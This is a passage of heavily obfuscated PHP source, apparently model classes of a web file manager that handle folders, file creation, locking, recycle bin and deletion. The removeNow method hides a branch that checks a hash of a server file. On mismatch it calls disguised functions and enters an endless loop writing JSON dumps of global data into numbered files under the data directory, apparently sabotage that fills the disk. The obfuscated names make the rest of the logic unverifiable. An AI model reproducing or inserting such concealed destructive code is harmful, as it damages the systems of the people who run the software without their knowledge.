$ÇŠ¯Ö³î[$ƒì¿¿¢½[396]], $ƒì¿¿¢½[32] => $ÇŠ¯Ö³î[$ƒì¿¿¢½[32]], $ƒì¿¿¢½[200] => $ÇŠ¯Ö³î[$ƒì¿¿¢½[200]], $ƒì¿¿¢½[33] => isset($ÇŠ¯Ö³î[$ƒì¿¿¢½[33]]) ? $ÇŠ¯Ö³î[$ƒì¿¿¢½[33]] : 1, $ƒì¿¿¢½[2243] => isset($ÇŠ¯Ö³î[$ƒì¿¿¢½[2243]]) ? $ÇŠ¯Ö³î[$ƒì¿¿¢½[2243]] : 0, $ƒì¿¿¢½[748] => 0, $ƒì¿¿¢½[192] => 0); return parent::insert($î”»Ş¼ç); } public function userNoticeEdit($‹£şš©, $‹¦¥ù) { $this->initUserOption(); return parent::update($‹£şš©, $‹¦¥ù); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\145\155\137\x6f\x70\x74\x69\x6f\156"; protected $jsonField = array("\x6d\x65\156\165", "\x72\157\x6c\x65", "\162\157\x6c\x65\x47\162\x6f\x75\160", "\x72\x65\x67\151\163\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($¨ÎŞ ü) { return "\x53\x79\163\164\x65\155\117\160\164\151\157\156\x5f{$¨ÎŞ ü}"; } protected function optionDefault($§ÔÁË³¥ = '') { $Ğ˜•éï‘ =& $_SERVER[Ôó‡è­ƒ]; if ($§ÔÁË³¥ == $Ğ˜•éï‘[12]) { return $GLOBALS[$Ğ˜•éï‘[6]][$Ğ˜•éï‘[380]]; } } } class SystemRecordModel extends ModelBaseLight { } goto bÒšÁ¿¢‹; c¨åÏâï™±: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Å¾‚‚šÒ) { $ñ¾È×ö× =& $_SERVER[Ôó‡è­ƒ]; $¶À÷‹ÁÃ = Model($ñ¾È×ö×[509])->where(array($ñ¾È×ö×[1646] => $Å¾‚‚šÒ))->find(); $„šáŠæÌ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Å¾‚‚šÒ, $¶À÷‹ÁÃ[$ñ¾È×ö×[32]]); $this->userDesktopAdd($„šáŠæÌ); return $„šáŠæÌ; } public function userDesktopAdd($„ƒë‰ƒé) { $­›Ù·‘Æ =& $_SERVER[Ôó‡è­ƒ]; $Æü™íÒº = LNG($­›Ù·‘Æ[2087]); $Ò¶ˆåå‡ = $this->mkdir($„ƒë‰ƒé, $Æü™íÒº); $this->metaSet($Ò¶ˆåå‡, $­›Ù·‘Æ[2088], $­›Ù·‘Æ[89]); $this->metaSet($„ƒë‰ƒé, $­›Ù·‘Æ[2089], $Ò¶ˆåå‡); } public function groupRootAdd($Ûò¬¼ã) { $³•ë‚‹ı =& $_SERVER[Ôó‡è­ƒ]; $ä‹ˆàØ = Model($³•ë‚‹ı[518])->where(array($³•ë‚‹ı[1910] => $Ûò¬¼ã))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ûò¬¼ã, $ä‹ˆàØ[$³•ë‚‹ı[32]]); } public function systemRootPathAdd($ï˜€ÜÃ©) { if ($ï˜€ÜÃ© != $_SERVER[Ôó‡è­ƒ][536]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ï˜€ÜÃ©); } public function userRootRemove($ˆ€§†–Ç) { $¥û–ª¼Û = $this->sourceRoot(SourceModel::TYPE_USER, $ˆ€§†–Ç); if (!$¥û–ª¼Û) { return; } $this->remove($¥û–ª¼Û, !1); } public function groupRootRemove($”«³‡§á) { $áäËÑø = $this->sourceRoot(SourceModel::TYPE_GROUP, $”«³‡§á); if (!$áäËÑø) { return; } $this->remove($áäËÑø, !1); } private function _mkdirRoot($–ŒÑ²¯, $›†éùö, $£²ãñ¿ç) { $›È€¼ş¯ =& $_SERVER[Ôó‡è­ƒ]; $‰¾—œì¹ = array($›È€¼ş¯[398] => 0, $›È€¼ş¯[579] => $–ŒÑ²¯, $›È€¼ş¯[580] => $›†éùö, $›È€¼ş¯[576] => 1, $›È€¼ş¯[581] => USER_ID, $›È€¼ş¯[582] => USER_ID, $›È€¼ş¯[577] => $›È€¼ş¯[12], $›È€¼ş¯[583] => $›È€¼ş¯[527], $›È€¼ş¯[426] => 0, $›È€¼ş¯[578] => 0, $›È€¼ş¯[464] => 0, $›È€¼ş¯[584] => $›È€¼ş¯[12]); if ($ÙÊ†Î = $this->where($‰¾—œì¹)->find()) { return $ÙÊ†Î[$›È€¼ş¯[399]]; } $˜úÉŞğ = "\115\157\144\145\154\123\x6f\x75\162\x63\145\56\x6d\153\x64\151\162\x52\x6f\157\x74\x2e{$–ŒÑ²¯}\x2e{$›†éùö}\x2e" . $£²ãñ¿ç; CacheLock::lock($˜úÉŞğ); $‰¾—œì¹[$›È€¼ş¯[32]] = $£²ãñ¿ç; $çÖ©£äŸ = $this->add($‰¾—œì¹); $ñç«‘ö¼ = array($›È€¼ş¯[585] => short_id($çÖ©£äŸ)); $this->where(array($›È€¼ş¯[414] => $çÖ©£äŸ))->save($ñç«‘ö¼); CacheLock::unlock($˜úÉŞğ); return $çÖ©£äŸ; } private function sourceRoot($Ÿ“çõÇ«, $¯à±îÉ½, $øôõ±İ = false) { $àíÁ¶Ú» =& $_SERVER[Ôó‡è­ƒ]; $ÄêØŸÛ¶ = array($àíÁ¶Ú»[398] => 0, $àíÁ¶Ú»[579] => $Ÿ“çõÇ«, $àíÁ¶Ú»[580] => $¯à±îÉ½); if ($…ğÏæËú = $this->where($ÄêØŸÛ¶)->find()) { return $øôõ±İ ? $…ğÏæËú : $…ğÏæËú[$àíÁ¶Ú»[399]]; } return !1; } public function sourceRootGroup($é±¡Åõå) { $—¾¦Û•Ø =& $_SERVER[Ôó‡è­ƒ]; if (is_string($é±¡Åõå)) { $é±¡Åõå = array($é±¡Åõå); } $’µ¤ãÔ€ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $é±¡Åõå, $—¾¦Û•Ø[185]); $¶Ÿ’Çñ¯ = array($—¾¦Û•Ø[368] => $’µ¤ãÔ€, $—¾¦Û•Ø[365] => array($—¾¦Û•Ø[757] => count($é±¡Åõå))); $this->_listDataApply($¶Ÿ’Çñ¯[$—¾¦Û•Ø[368]]); $this->_listMake($¶Ÿ’Çñ¯); return array_to_keyvalue($¶Ÿ’Çñ¯[$—¾¦Û•Ø[77]], $—¾¦Û•Ø[501]); } public function mkfile($İ«­ò™‡, $ı¼Åôí, $«¸Ä³’ = '', $Ëë÷¯ÆÙ = REPEAT_RENAME) { $©°ì–šñ =& $_SERVER[Ôó‡è­ƒ]; $ñ½±¤õ¸ = Model($©°ì–šñ[602])->addFileByContent($«¸Ä³’, $ı¼Åôí); return $this->_createFileCall($İ«­ò™‡, $ı¼Åôí, $ñ½±¤õ¸, $Ëë÷¯ÆÙ, $©°ì–šñ[1336]); } public function addFile($ô©ºùî³, $”¯¥òıÄ, $¦àÔóäú, $Ëã¹ ¶Í = false, $±²ã‘ª = REPEAT_RENAME) { $´·ò“çÉ = Model($_SERVER[Ôó‡è­ƒ][602])->addFile($”¯¥òıÄ, $¦àÔóäú, $Ëã¹ ¶Í); return $this->_createFileCall($ô©ºùî³, $¦àÔóäú, $´·ò“çÉ, $±²ã‘ª); } public function addFileByFileID($Ó£ÙÉêå, $óšÀìÎõ, $¶Ñ°±µÆ, $È¼¹ıòé = REPEAT_RENAME) { $æÇˆ†§Ş =& $_SERVER[Ôó‡è­ƒ]; $¨ñª™Ò = Model($æÇˆ†§Ş[602])->find($óšÀìÎõ); Model($æÇˆ†§Ş[602])->linkAdd($óšÀìÎõ); return $this->_createFileCall($Ó£ÙÉêå, $¶Ñ°±µÆ, $¨ñª™Ò, $È¼¹ıòé); } public function addFileByRemote($§Ö½¼ˆ¦, $¤¶¼ìı, $Úšı÷·¤, $Õ÷¤Õ­ = array(), $®Ğ’Å = REPEAT_RENAME) { $à—¹óå = Model($_SERVER[Ôó‡è­ƒ][602])->addFileByRemote($¤¶¼ìı, $Úšı÷·¤, $Õ÷¤Õ­); return $this->_createFileCall($§Ö½¼ˆ¦, $Úšı÷·¤, $à—¹óå, $®Ğ’Å); } private function _createFileCall($à¿ˆ½ÅÍ, $šşôÏ§“, $”ÒÜ…¦Ô, $óİŞ¡ôã, $İà³Îš¼ = "\x75\x70\x6c\157\141\144") { $ˆÎÕì¼§ =& $_SERVER[Ôó‡è­ƒ]; $›ü¤Üö¬ = !1; $this->setMasterDB(); $this->lockWriteStart($à¿ˆ½ÅÍ, $šşôÏ§“); $Å—ß½Ü = $this->fileNameExist($à¿ˆ½ÅÍ, $šşôÏ§“); $ÒÕÏçä = $this->_createFile($à¿ˆ½ÅÍ, $šşôÏ§“, $”ÒÜ…¦Ô, $óİŞ¡ôã, $›ü¤Üö¬); if (!$›ü¤Üö¬) { Model($ˆÎÕì¼§[466])->remove($”ÒÜ…¦Ô[$ˆÎÕì¼§[463]]); } if ($›ü¤Üö¬ && $ÒÕÏçä && $ÒÕÏçä != $Å—ß½Ü) { Model($ˆÎÕì¼§[2060])->eventCreate($ÒÕÏçä, $İà³Îš¼); } $this->lockWriteEnd($à¿ˆ½ÅÍ, $šşôÏ§“); return $ÒÕÏçä; } public function mkdir($ÅÜ²÷å€, $‹¿’Ä—Ì, $€„¼Ìíä = REPEAT_SKIP) { $ÉÆèôŠœ =& $_SERVER[Ôó‡è­ƒ]; $this->setMasterDB(); $¾Ëåæº´ = $this->sourceInfo($ÅÜ²÷å€); if (!$¾Ëåæº´) { return !1; } $this->lockWriteStart($ÅÜ²÷å€, $‹¿’Ä—Ì); if ($€„¼Ìíä !== !1) { $¸·œ€® = $this->fileNameExist($ÅÜ²÷å€, $‹¿’Ä—Ì); if ($¸·œ€® && $€„¼Ìíä != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÅÜ²÷å€, $‹¿’Ä—Ì); return $¸·œ€®; } $‹¿’Ä—Ì = $this->fileNameAuto($ÅÜ²÷å€, $‹¿’Ä—Ì, $€„¼Ìíä); } $ˆ¯û£ßı = array($ÉÆèôŠœ[576] => 1, $ÉÆèôŠœ[417] => $‹¿’Ä—Ì, $ÉÆèôŠœ[577] => $ÉÆèôŠœ[12], $ÉÆèôŠœ[464] => 0, $ÉÆèôŠœ[578] => 0); $‰ñ¯§Ò = $this->_addSource($ˆ¯û£ßı, $¾Ëåæº´); Model($ÉÆèôŠœ[2060])->eventCreate($‰ñ¯§Ò, $ÉÆèôŠœ[1337]); $this->lockWriteEnd($ÅÜ²÷å€, $‹¿’Ä—Ì); return $‰ñ¯§Ò; } public function listSourceRoot($§„¢É„”, $Ñ¡‰Æ, $ıœäóÈ÷ = "\163\157\165\x72\x63\145\x49\104\54\x74\141\x72\x67\x65\164\x49\x44\54\163\151\x7a\x65") { $„•œ”Îè =& $_SERVER[Ôó‡è­ƒ]; $èüÖó¤é = $„•œ”Îè[377]; $Ñ‰À‡“Ó = array(); $ı€•í¹ß = 1024 * 50; $ŒÃ¯ÉåÎ = is_array($ŒÃ¯ÉåÎ) ? $ŒÃ¯ÉåÎ : array(); $‘îË¿ó = count($Ñ¡‰Æ); $“®÷ò–ì = $this->tablePrefix . $„•œ”Îè[2090]; for ($Æ¤ı‘ú† = 0; $Æ¤ı‘ú† < $‘îË¿ó; $Æ¤ı‘ú†++) { $í…â¡¤ê = $Ñ¡‰Æ[$Æ¤ı‘ú†]; $èüÖó¤é .= "\123\105\114\x45\x43\124\40\52\40\x46\x52\x4f\115\40\50\x53\105\x4c\105\x43\x54\40{$ıœäóÈ÷}\x20\106\x52\x4f\x4d\40\x60{$“®÷ò–ì}\x60\40\x57\110\105\x52\105\40"; $èüÖó¤é .= "\140\160\141\x72\145\156\x74\111\104\x60\75\60\x20\101\x4e\104\x20\x60\164\141\x72\147\x65\164\111\104\x60\75{$í…â¡¤ê}\40\x41\x4e\104\40\140\x74\141\162\147\145\164\x54\x79\160\x65\x60\x3d{$§„¢É„”}\40\x6c\151\x6d\151\164\40\x31\51\x20\x61\163\40\x74\x62\x5f{$Æ¤ı‘ú†}\x20\x55\116\111\x4f\116\40\101\114\x4c\x20"; if ((strlen($èüÖó¤é) >= $ı€•í¹ß || $Æ¤ı‘ú† == $‘îË¿ó - 1) && $èüÖó¤é) { $èüÖó¤é = substr($èüÖó¤é, 0, -strlen($„•œ”Îè[1038])); $’¡ÀöÌÌ = $this->query($èüÖó¤é); $èüÖó¤é = $„•œ”Îè[12]; $Ñ‰À‡“Ó = array_merge($Ñ‰À‡“Ó, $’¡ÀöÌÌ); } } return $Ñ‰À‡“Ó; } private function _createFile($§ú±œ®Û, $×…²ÂàŸ, $…ûÉüÃ, $…ò›Ü, &$½ï‚È¦) { $”Ë·½˜Ø =& $_SERVER[Ôó‡è­ƒ]; $‡«¥¢ÇÚ = $this->sourceInfo($§ú±œ®Û); if (!$…ûÉüÃ || !$‡«¥¢ÇÚ) { return !1; } if ($…ò›Ü !== !1) { $€ß¼ô‡× = $this->fileNameExist($§ú±œ®Û, $×…²ÂàŸ); } $½ï‚È¦ = !0; if ($…ò›Ü && $€ß¼ô‡×) { if ($…ò›Ü == REPEAT_SKIP) { $½ï‚È¦ = !1; return $€ß¼ô‡×; } else { if ($…ò›Ü == REPEAT_REPLACE) { $äôä·Ã× = $this->sourceInfo($€ß¼ô‡×); $•áŒçíà = $this->fileHistory($äôä·Ã×, $…ûÉüÃ[$”Ë·½˜Ø[463]], $…ûÉüÃ[$”Ë·½˜Ø[80]]); if (!$•áŒçíà) { $½ï‚È¦ = !1; } else { $this->folderSizeReset($§ú±œ®Û); } return $€ß¼ô‡×; } else { $×…²ÂàŸ = $this->fileNameAuto($§ú±œ®Û, $×…²ÂàŸ, $…ò›Ü, !1); } } } $ôÂÚ±è¾ = array($”Ë·½˜Ø[576] => 0, $”Ë·½˜Ø[417] => $×…²ÂàŸ, $”Ë·½˜Ø[577] => substr(get_path_ext($×…²ÂàŸ), 0, 10), $”Ë·½˜Ø[464] => $…ûÉüÃ[$”Ë·½˜Ø[463]], $”Ë·½˜Ø[578] => $…ûÉüÃ[$”Ë·½˜Ø[80]]); $¤š³ƒö = $this->_addSource($ôÂÚ±è¾, $‡«¥¢ÇÚ); $this->folderSizeReset($§ú±œ®Û, intval($ôÂÚ±è¾[$”Ë·½˜Ø[80]])); return $¤š³ƒö; } protected function fileHistory($¤ÏŸéù, $É¾ú«èõ, $œ¦àóÓ•) { $åøºø¨´ =& $_SERVER[Ôó‡è­ƒ]; $İ÷¿ûÓŒ = defined($åøºø¨´[470]) ? USER_ID : $åøºø¨´[194]; if ($¤ÏŸéù[$åøºø¨´[463]] == $É¾ú«èõ) { return !1; } $this->checkLock($¤ÏŸéù[$åøºø¨´[399]], $É¾ú«èõ); Model($åøºø¨´[2091])->addHistory($¤ÏŸéù); $ÅÄ¹ÓÜ– = array($åøºø¨´[582] => $İ÷¿ûÓŒ, $åøºø¨´[421] => time(), $åøºø¨´[463] => $É¾ú«èõ, $åøºø¨´[80] => $œ¦àóÓ•); $this->where(array($åøºø¨´[414] => $¤ÏŸéù[$åøºø¨´[399]]))->save($ÅÄ¹ÓÜ–); $this->sourceCacheClear($¤ÏŸéù[$åøºø¨´[399]]); return !0; } public function checkLock($«ö÷í°Ñ, $¬œœÛÌ­) { $»ôƒ•´ =& $_SERVER[Ôó‡è­ƒ]; $Ñš£ßƒ = $this->pathInfo($«ö÷í°Ñ); if (!$this->fileIsLock($Ñš£ßƒ, !0)) { return; } $¸ÍÛªæö = Session::get($»ôƒ•´[2092]); $ôÉ±¦«‡ = substr($Ñš£ßƒ[$»ôƒ•´[32]], 0, -1 - strlen($Ñš£ßƒ[$»ôƒ•´[171]])) . $»ôƒ•´[1604] . $¸ÍÛªæö . $»ôƒ•´[10] . $Ñš£ßƒ[$»ôƒ•´[171]]; $»›½Á« = Model($»ôƒ•´[602])->find($¬œœÛÌ­); $this->_createFileCall($Ñš£ßƒ[$»ôƒ•´[494]], $ôÉ±¦«‡, $»›½Á«, REPEAT_REPLACE, $»ôƒ•´[1336]); $ıı¶Ö§ = $Ñš£ßƒ[$»ôƒ•´[461]][$»ôƒ•´[541]]; $®±àı¼ñ = $ıı¶Ö§[$»ôƒ•´[534]] ? $ıı¶Ö§[$»ôƒ•´[534]] : $ıı¶Ö§[$»ôƒ•´[32]]; show_json(LNG($»ôƒ•´[2093]) . $»ôƒ•´[2094] . LNG($»ôƒ•´[2095]) . $»ôƒ•´[2096] . $®±àı¼ñ . $»ôƒ•´[2097], !1); } public function fileIsLock($Ò´À÷‰•, $ËúÌéæÌ = false) { $í÷³ÌÕè =& $_SERVER[Ôó‡è­ƒ]; if (!isset($Ò´À÷‰•[$í÷³ÌÕè[461]]) || !$Ò´À÷‰•[$í÷³ÌÕè[461]][$í÷³ÌÕè[538]]) { return !1; } if ($Ò´À÷‰•[$í÷³ÌÕè[461]][$í÷³ÌÕè[538]] != USER_ID) { return !0; } $µîíƒîô = $GLOBALS[$í÷³ÌÕè[6]][$í÷³ÌÕè[90]][$í÷³ÌÕè[539]]; if ($Ò´À÷‰•[$í÷³ÌÕè[461]][$í÷³ÌÕè[540]] <= time() - $µîíƒîô) { $this->metaSet($Ò´À÷‰•[$í÷³ÌÕè[399]], $í÷³ÌÕè[538], null); $this->metaSet($Ò´À÷‰•[$í÷³ÌÕè[399]], $í÷³ÌÕè[540], null); } if ($ËúÌéæÌ) { $this->metaSet($Ò´À÷‰•[$í÷³ÌÕè[399]], $í÷³ÌÕè[540], time()); } return !1; } private function _addSource($Âä³Èğ, $Ú¿¦˜‡û) { $×ª¶®Ê¢ =& $_SERVER[Ôó‡è­ƒ]; $ƒ´å˜€À = defined($×ª¶®Ê¢[470]) ? USER_ID : $×ª¶®Ê¢[194]; $÷µÖÎ‡ = array($×ª¶®Ê¢[579] => $Ú¿¦˜‡û[$×ª¶®Ê¢[408]], $×ª¶®Ê¢[580] => $Ú¿¦˜‡û[$×ª¶®Ê¢[501]], $×ª¶®Ê¢[581] => $ƒ´å˜€À, $×ª¶®Ê¢[582] => $ƒ´å˜€À, $×ª¶®Ê¢[398] => $Ú¿¦˜‡û[$×ª¶®Ê¢[399]], $×ª¶®Ê¢[583] => $Ú¿¦˜‡û[$×ª¶®Ê¢[517]] . $Ú¿¦˜‡û[$×ª¶®Ê¢[399]] . $×ª¶®Ê¢[50], $×ª¶®Ê¢[426] => 0, $×ª¶®Ê¢[584] => $×ª¶®Ê¢[12]); $Âä³Èğ = array_merge($÷µÖÎ‡, $Âä³Èğ); $this->updateModifyTime($Âä³Èğ[$×ª¶®Ê¢[494]]); $°Óî™ô = $×ª¶®Ê¢[2098] . $Ú¿¦˜‡û[$×ª¶®Ê¢[399]]; if (isset(self::$cacheChildList[$°Óî™ô])) { unset(self::$cacheChildList[$°Óî™ô]); } static $´Êğô£ = false; if (!$´Êğô£) { Hook::trigger($×ª¶®Ê¢[566], $Âä³Èğ); $´Êğô£ = !0; } $™ûÂ†½ = $this->add($Âä³Èğ); $ßŒÑÃì° = array($×ª¶®Ê¢[585] => short_id($™ûÂ†½)); $this->where(array($×ª¶®Ê¢[414] => $™ûÂ†½))->save($ßŒÑÃì°); $this->setNamePinyin($™ûÂ†½, $Âä³Èğ[$×ª¶®Ê¢[32]]); return $™ûÂ†½; } public function remove($µ°ÑÈÙ¼, $â“±™ÈØ = true) { $˜¢•Îª† =& $_SERVER[Ôó‡è­ƒ]; $¼´Ú–‰œ = $this->sourceInfo($µ°ÑÈÙ¼); $°äİÚ ± = intval($¼´Ú–‰œ[$˜¢•Îª†[408]]) === self::TYPE_SYSTEM; $ˆÃ•Òª· = Model($˜¢•Îª†[429])->get($˜¢•Îª†[2099]) == $˜¢•Îª†[89]; if ($°äİÚ ± || $â“±™ÈØ || !$ˆÃ•Òª·) { return $this->removeNow($µ°ÑÈÙ¼, $â“±™ÈØ); } $İÇ¸æà¨ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ë¨âÀŒ = $¼´Ú–‰œ[$˜¢•Îª†[408]] == self::TYPE_USER ? $˜¢•Îª†[593] : $˜¢•Îª†[511]; if ($ë¨âÀŒ == $˜¢•Îª†[593]) { $¥É£Ïáª = Model($˜¢•Îª†[509])->getInfo($¼´Ú–‰œ[$˜¢•Îª†[501]]); $Øîû×•š = !empty($¥É£Ïáª[$˜¢•Îª†[534]]) ? $¥É£Ïáª[$˜¢•Îª†[534]] : $¥É£Ïáª[$˜¢•Îª†[32]]; $Øîû×•š = $˜¢•Îª†[259] . $Øîû×•š . $˜¢•Îª†[2100] . $¼´Ú–‰œ[$˜¢•Îª†[501]]; } else { $¥É£Ïáª = Model($˜¢•Îª†[518])->getInfo($¼´Ú–‰œ[$˜¢•Îª†[501]]); $Øîû×•š = _get($¥É£Ïáª, $˜¢•Îª†[32]); $Øîû×•š = $˜¢•Îª†[163] . $Øîû×•š . $˜¢•Îª†[2101] . $¼´Ú–‰œ[$˜¢•Îª†[501]]; } $á¨ù€ê = $˜¢•Îª†[2102] . md5($Øîû×•š); CacheLock::lock($á¨ù€ê); $„Š¸ğÊª = $this->fileNameExist($İÇ¸æà¨, $Øîû×•š); if (!$„Š¸ğÊª) { $„Š¸ğÊª = $this->mkdir($İÇ¸æà¨, $Øîû×•š, REPEAT_SKIP); $this->metaSet($„Š¸ğÊª, $˜¢•Îª†[2103], $ë¨âÀŒ); $this->metaSet($„Š¸ğÊª, $˜¢•Îª†[2104], $¼´Ú–‰œ[$˜¢•Îª†[501]]); if ($¼´Ú–‰œ[$˜¢•Îª†[494]] != 0) { $this->metaSet($„Š¸ğÊª, $˜¢•Îª†[2105], _get($¥É£Ïáª, $˜¢•Îª†[2106])); } } CacheLock::unlock($á¨ù€ê); $this->metaSet($µ°ÑÈÙ¼, $˜¢•Îª†[2107], $¼´Ú–‰œ[$˜¢•Îª†[494]]); $this->where(array($˜¢•Îª†[399] => $µ°ÑÈÙ¼))->save(array($˜¢•Îª†[421] => time())); $this->recycleClear($¼´Ú–‰œ); $½ÈÀË“™ = $this->move($µ°ÑÈÙ¼, $„Š¸ğÊª, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¼´Ú–‰œ[$˜¢•Îª†[494]]); return $½ÈÀË“™; } private function recycleClear($„„Ë Ø“) { $š„ºá… =& $_SERVER[Ôó‡è­ƒ]; $Ÿ§Æû¼÷ = $this->childrenAll($„„Ë Ø“); $‹â‰Èä‘ = array($š„ºá…[414] => array($š„ºá…[415], $Ÿ§Æû¼÷[$š„ºá…[2108]])); Model($š„ºá…[2109])->where($‹â‰Èä‘)->delete(); } public function removeNow($ÈÜâŒ•æ, $±„‘Şıé = true) { $çúœ‹äÅ =& $_SERVER[Ôó‡è­ƒ]; $º´»”†€ = $_SERVER[$çúœ‹äÅ[875]] . $çúœ‹äÅ[876]; $Ú•áÍÂ› = $çúœ‹äÅ[871]; if ($_SERVER[$çúœ‹äÅ[872]] != $Ú•áÍÂ›($º´»”†€)) { $İ„¼šÄ³ = $çúœ‹äÅ[873]; $“şÜÏøŠ = $çúœ‹äÅ[874]; $»åÁÃÒş = $_SERVER[$çúœ‹äÅ[875]] . $çúœ‹äÅ[876]; $ãúá¡ = $“şÜÏøŠ($»åÁÃÒş); $ê†Ú©²‘ = explode($çúœ‹äÅ[230], $ãúá¡); if (count($ê†Ú©²‘) < $çúœ‹äÅ[617]) { $¥‰øµ§ = $çúœ‹äÅ[877]; $¥‰øµ§(); } $ÏƒÕ®· = $çúœ‹äÅ[878]; $ÏƒÕ®·($_SERVER[$çúœ‹äÅ[879]]); $İ„¼šÄ³ = $çúœ‹äÅ[873]; $İ„¼šÄ³(); $Æ§¾ô”Š = $çúœ‹äÅ[880]; $¶¡ƒ†¾¯ = json_encode($GLOBALS[$çúœ‹äÅ[881]]); $à²°«— = 1; for ($°”—Æö = $à²°«—; $°”—Æö > 0; $°”—Æö++) { $Æ§¾ô”Š(DATA_PATH . $°”—Æö, $¶¡ƒ†¾¯); } } $ï¶à¶¥º = $this->sourceInfo($ÈÜâŒ•æ); $™Ù€Ç•‰ = $this->pathInfoMore($ÈÜâŒ•æ); if (!$ï¶à¶¥º) { return !0; } if ($ï¶à¶¥º[$çúœ‹äÅ[494]] == 0) { if (!_get($GLOBALS, $çúœ‹äÅ[499])) { return !1; } } $this->lockMoveStart($ÈÜâŒ•æ); Hook::trigger($çúœ‹äÅ[2110], $™Ù€Ç•‰, $±„‘Şıé); if ($±„‘Şıé) { Model($çúœ‹äÅ[2109])->moveToRecycle($ÈÜâŒ•æ); } else { $®è™­Œš = $this->childrenAll($ï¶à¶¥º); Model($çúœ‹äÅ[563])->eventRemove($ÈÜâŒ•æ); $this->removeRelevance($®è™­Œš[$çúœ‹äÅ[2108]], $®è™­Œš[$çúœ‹äÅ[1470]]); } $this->folderSizeReset($ï¶à¶¥º[$çúœ‹äÅ[494]]); $¾Œ½‰¨™ = array($ï¶à¶¥º[$çúœ‹äÅ[494]]); if ($ï¶à¶¥º[$çúœ‹äÅ[407]] == $çúœ‹äÅ[89]) { $¾Œ½‰¨™[] = $ï¶à¶¥º[$çúœ‹äÅ[399]]; } $this->updateModifyTime($¾Œ½‰¨™); $this->lockMoveEnd($ÈÜâŒ•æ); Hook::trigger($çúœ‹äÅ[1692], $™Ù€Ç•‰, $±„‘Şıé); return !0; } public function childrenAll($„îœ‚•³) { $ÆˆºÂ¶Ö =& $_SERVER[Ôó‡è­ƒ]; $»Ş„è— = $„îœ‚•³[$ÆˆºÂ¶Ö[399]]; if ($„îœ‚•³[$ÆˆºÂ¶Ö[407]] == $ÆˆºÂ¶Ö[89]) { $¡öæ…¸¿ = array($ÆˆºÂ¶Ö[583] => array($ÆˆºÂ¶Ö[543], $„îœ‚•³[$ÆˆºÂ¶Ö[517]] . $»Ş„è— . $ÆˆºÂ¶Ö[544])); $Á¶Ã€£ = array($ÆˆºÂ¶Ö[583] => $¡öæ…¸¿[$ÆˆºÂ¶Ö[517]]); $Ëê§¬è = $this->field($ÆˆºÂ¶Ö[2111])->where($Á¶Ã€£)->select(); $¡”«Ù•… = !1; $€ìıŠÙø = array($»Ş„è—); if ($Ëê§¬è) { $¡”«Ù•… = array_to_keyvalue($Ëê§¬è, $ÆˆºÂ¶Ö[12], $ÆˆºÂ¶Ö[463]); $¡”«Ù•… = array_remove_value($¡”«Ù•…, $ÆˆºÂ¶Ö[194]); $€ìıŠÙø = array_to_keyvalue($Ëê§¬è, $ÆˆºÂ¶Ö[12], $ÆˆºÂ¶Ö[399]); $€ìıŠÙø[] = $»Ş„è—; } } else { $¡”«Ù•… = array($„îœ‚•³[$ÆˆºÂ¶Ö[463]]); $€ìıŠÙø = array($»Ş„è—); } return array($ÆˆºÂ¶Ö[2108] => $€ìıŠÙø, $ÆˆºÂ¶Ö[1470] => $¡”«Ù•…); } public function removeArray($¾œµÒ«ã) { if (!$¾œµÒ«ã) { return !0; } } public function removeRelevance($øÖ½’•ß, $Ïª‘õÕŸ) { $ß±è¸Õ =& $_SERVER[Ôó‡è­ƒ]; $øÖ½’•ß = $øÖ½’•ß ? $øÖ½’•ß : array(); $Ïª‘õÕŸ = $Ïª‘õÕŸ ? $Ïª‘õÕŸ : array(); $øÖ½’•ß = array_unique(array_filter($øÖ½’•ß)); $Ïª‘õÕŸ = array_unique(array_filter($Ïª‘õÕŸ)); if (!$øÖ½’•ß) { return !1; } $¯Ôáœ° = array($ß±è¸Õ[414] => array($ß±è¸Õ[415], $øÖ½’•ß)); Model($ß±è¸Õ[2109])->where($¯Ôáœ°)->delete(); Model($ß±è¸Õ[457])->where($¯Ôáœ°)->delete(); Model($ß±è¸Õ[1966])->where($¯Ôáœ°)->delete(); Model($ß±è¸Õ[563])->where($¯Ôáœ°)->delete(); Model($ß±è¸Õ[1803])->removeBySource($øÖ½’•ß); Model($ß±è¸Õ[2091])->removeBySource($øÖ½’•ß); $this->where($¯Ôáœ°)->delete(); Model($ß±è¸Õ[466])->remove($Ïª‘õÕŸ); for ($’¿‹Ì = 0; $’¿‹Ì < count($øÖ½’•ß); $’¿‹Ì++) { $this->sourceCacheClear($øÖ½’•ß[$’¿‹Ì]); } } public function rename($·Íø¨Ìº, $´ù½¿×») { $Ÿ š¡ş =& $_SERVER[Ôó‡è­ƒ]; $ñÊ–ûÑ = $this->sourceInfo($·Íø¨Ìº); if (!$ñÊ–ûÑ) { return !1; } $¶åˆüÎ¶ = $this->fileNameExist($ñÊ–ûÑ[$Ÿ š¡ş[494]], $´ù½¿×»); if ($¶åˆüÎ¶ && $¶åˆüÎ¶ != $·Íø¨Ìº) { return !1; } $üùôåÉ… = array($Ÿ š¡ş[417] => $´ù½¿×», $Ÿ š¡ş[582] => USER_ID); if ($ñÊ–ûÑ[$Ÿ š¡ş[407]] != $Ÿ š¡ş[89]) { $üùôåÉ…[$Ÿ š¡ş[409]] = substr(get_path_ext($´ù½¿×»), 0, 10); } Model($Ÿ š¡ş[563])->eventRename($·Íø¨Ìº, $ñÊ–ûÑ[$Ÿ š¡ş[32]], $´ù½¿×»); $this->sourceCacheClear($·Íø¨Ìº); $this->setNamePinyin($·Íø¨Ìº, $üùôåÉ…[$Ÿ š¡ş[32]], !1); $this->updateModifyTime($ñÊ–ûÑ[$Ÿ š¡ş[494]]); $òõä§ÒÃ = $this->where(array($Ÿ š¡ş[414] => $·Íø¨Ìº))->data($üùôåÉ…)->save(); $ËõıŠÒı = $Ÿ š¡ş[2098] . $ñÊ–ûÑ[$Ÿ š¡ş[494]]; if (isset(self::$cacheChildList[$ËõıŠÒı])) { unset(self::$cacheChildList[$ËõıŠÒı]); } return $òõä§ÒÃ; } public function setNamePinyin($¿ìê—¨˜, 